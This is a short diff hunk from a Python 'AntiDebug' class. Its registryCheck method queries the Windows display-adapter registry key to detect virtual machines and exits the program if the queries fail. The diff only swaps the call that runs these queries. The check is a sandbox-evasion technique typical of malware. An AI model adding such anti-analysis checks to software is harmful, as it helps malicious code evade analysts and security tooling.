@@ -142,9 +142,9 @@ class AntiDebug:
             self.programExit()
 
     def registryCheck(self):
-        reg1 = system(
+        reg1 = donotuse_system( # cause start /B breaks this
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
-        reg2 = system(
+        reg2 = donotuse_system( # cause start /B breaks this
             "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
         if (reg1 and reg2) != 1:
             self.programExit()
